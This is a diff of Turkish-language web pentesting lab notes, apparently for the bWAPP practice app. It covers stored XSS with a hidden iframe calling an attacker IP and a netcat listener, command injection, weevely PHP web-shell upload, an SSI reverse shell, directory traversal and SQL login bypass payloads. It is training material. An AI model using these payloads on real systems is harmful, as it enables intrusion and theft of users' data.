@@ -21,7 +21,7 @@ eğer bir stored açığı olursa burda çalıştırdığımız bir kod web site
 alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
 peki daha teklikeli olarak ne yapılabilir;
 <iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
-kendi bilgisayarımızın ip sini ve kullanılmayan bir portadresi yazıyoruz 
+kendi bilgisayarımızın ip sini ve kullanılmayan bir port adresi yazıyoruz 
 
 bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
 dinlemek için linux terminalimizde natcat kullanacağız 
@@ -31,7 +31,8 @@ linux natcat komutu: nc -nvlp 4545 dinlemek için
 ![photo_6023604428080265325_w](https://user-images.githubusercontent.com/110966683/183884730-c7d1a93e-aefe-488d-938b-738bfcd1d907.jpg)
 
 
-görüldüğü gibi belirlediğimizportu dinledi ve kullanıcının bilgilerini getirdi.
+görüldüğü gibi belirlediğimiz portu dinledi ve kullanıcının bilgilerini getirdi.
+
 
 İFRAME ENJECTİON
 
@@ -58,10 +59,10 @@ php urlsinde komut çalıştırmayı deniyoruz
 normalde iki komut çalıştırmek için komutların arasına ; konur şimdi bunu deneyeceğiz
 ; koyup system("whoamı") çalıştırıyoruz yani sistem içinde ben kimim komutu çalıştırıyoruz 
 
-php upload açıkları
-upload açıkları 
-weevely weevely aracı bizim için php payloadı oluşturuyor 
-weevely generate 123456 myweevely.php
+php upload açıkları:
+weevely
+weevely aracı bizim için php payloadı oluşturuyor.
+komut = weevely generate 123456 myweevely.php
 weevely generate yazıp şifre sonrada isim yazıp payload oluşturuyoruz bunu resim update etme yerinden update etmeyi deneyeceğiz ve upload olunca weevely aracımıza gelip 
 weevely yazıyoruz sonra update ettiğimiz url yi ve son olarak şifreyi yazıp giriyoruz 
 
@@ -74,7 +75,8 @@ varsayalım ki php yüklemeye çalıştığınız sistem .php uzantısını enge
 
 
 
-kod çalıştırma açıkları
+KOD ÇALIŞTIRMA AÇIKLARI
+
 dns lookup da google.com yazınca server ip adres, falan çıktığını görüyoruz demekki burda bir komut çalışıyor ve bu bilgiler bize geliyor.
 
 ![photo_6025856227893950502_w](https://user-images.githubusercontent.com/110966683/183921757-a1247bc9-64c7-4e48-9fd9-a473487bafcd.jpg)
@@ -90,13 +92,13 @@ dns lookup da google.com yazınca server ip adres, falan çıktığını görüy
 
 
 gördüğünüz gibi ls komutu çalıştı demekki burda kod çalıştırma açığı var.
-ekstra olarak site ; işaretini engellemiş olabilir biz kendi terminalimizde 2 komut çalıştırmak istediğimizde && (ve) işaretini koyarsak yazılan 2 komutu da çalıştır anlamına gelir ya da | (alt ve tire tuşlarıyla yapabilirsiniz) işaretiye ilkkomutu çalıştır ilk komutun cevabını al 2. komutta kullan anlamına gelen bu işareti kullanırız o yüzden ; olmazsa tek tek diğer işaretleride deneyebilirsiniz.
+ekstra olarak site ; işaretini engellemiş olabilir biz kali terminalimizde 2 komut çalıştırmak istediğimizde && (ve) işaretini koyarsak yazılan 2 komutu da çalıştır anlamına gelir ya da | (alt ve tire tuşlarıyla yapabilirsiniz) işaretiye ilk komutu çalıştır ilk komutun cevabını al 2. komutta kullan anlamına gelen bu işareti kullanırız o yüzden ; olmazsa tek tek diğer işaretleride deneyebilirsiniz.
 
 
 bunun için linux ta hazır bir tool var onu inceleyelim
 commix
 nasıl çalıştığını anlamak için öncelikle commix --help yazıp dökümanına bakabilirsiniz 
-ama daha öncesinde burp suiti açmamız gerek burp suiti açıp target kısmından  bWAPP klasörüne gelip  post medodunu açıyoruz burda bizemiz hakkında bilgiler yazıyor
+ama daha öncesinde burp suiti açmamız gerek burp suiti açıp target kısmından  bWAPP klasörüne gelip  post metodunu açıyoruz burda bizim sitemiz hakkında bilgiler yazıyor
 
 ![photo_6025856227893950508_w](https://user-images.githubusercontent.com/110966683/183929265-e9f02c35-f80e-4215-909d-61705a5ce74f.jpg)
 
@@ -127,6 +129,7 @@ eğerki bir web sitesinde .shtml görüyarsanız o web sitesinde ssı vardır.
 
 gördüğünüz gibi sitemizde .shtml var
 
+
 ![photo_6028108027707636192_w](https://user-images.githubusercontent.com/110966683/184120309-9e3e7c24-d736-4e56-af81-9c631df301ee.jpg)
 
 şimdi ssı kodlarına bakıp örnek bir komut çalıştıralım.
@@ -146,7 +149,9 @@ kali terminalimizden nc -nvlp 1234 komutunu çalıştırıp 1234 portunu dinleme
 ve gördüğünüz gibi bağlantı geldi yazdığımız komutlarla sistemi hacklediğimizi görüyoruz.
 
 DİRECTORY TRAVERSEL AÇIKLARI 
+
 erişim sağlanan yerlerde bug var yani erişimimiz olmayan dosyaları görebilme açıkları 
+
 directory traversel - files:
 
 ![photo_6028108027707636196_w](https://user-images.githubusercontent.com/110966683/184121451-864aef7b-b6d9-4b7b-8de9-92906c7603a2.jpg)
@@ -184,6 +189,7 @@ aşşağı indikçe bu şekilde çok örnek görebilirsiniz default olarak 6 aya
 
 XSS AÇIKLARI 
 web pentesting yaparken karşımıza en fazla çıkan açık türüdür.
+
 xss reflected get:
 siteye normal kullanıcı adı şifremizi yazınca url de gözüğtüğünü görüyoruz
 
@@ -229,7 +235,7 @@ komutunu deneyelim
 
 unerror komutu yükleyemezsem ne yapayım diye soruyor ve alert yazdığımız içinde gördüğünüz gibi ekrana uyarı mesajını verdi bu komut kullanılan bir kalıptır sizde xss testlerinizde bu komutu kullanabilirsiniz.
 
-xss-stored(blog)
+xss-stored(blog):
 stored açığı bulursanız eğer uyguladığınız script siteye giren herkese uygulanır bu nedenle az bulunan bir açıktır.
 şimdi verilen panelde script kodu çalıştırmayı deniyoruz 
 
@@ -248,6 +254,8 @@ gördüğünüz gibi çalıştı bu siteye giren herkes artık bu uyarı mesajı
 SQL ENJEKSİYON AÇIKLARI 
 
 SQL ENJEKSİYON
+SQL enjeksiyon’u, SQL kodlarının hedef sisteme enjekte edilmesinin ardından sistemin veritabanından istenilen bilgilerin elde edilmesi olarak tanımlayabiliriz.
+
 ilk olarak sql enjeksiyonun olup olmadığını anlamak için ilk adım olarak kullanıcı adı 
 ya da şifre yerine tek tırnak işareti koyalım.Bazı sitelerde tek tırnak koyduktan sonra detaylı bir hata mesajı alabilirsiniz.
 
@@ -258,7 +266,7 @@ gördüğünüz gibi burda şifre yerine ' tek tırnak işareti koydum ve gelen 
 
 0' or '0' = '0
 
-0 ya da 0=0 olursa login ol anlamında yani her iki seçenekten sadece biri bile doğruysa 1 kabul et buda login olmamızı sağlar hem şifre hem kullanıcı adı kısmına aynı şeyi yazıp enter diyoruz 
+ şifre 0 ise login ol ya da 0=0 yani sıfır sıfıra eşitse login ol yani her iki seçenekten sadece biri bile doğruysa 1 kabul et buda login olmamızı sağlar hem şifre hem kullanıcı adı kısmına aynı şeyi yazıp enter diyoruz 
 
 ![photo_6030673690846410787_w](https://user-images.githubusercontent.com/110966683/184313457-4f1fcfce-ad5c-46a0-bce4-c7b060e789c0.jpg)
 
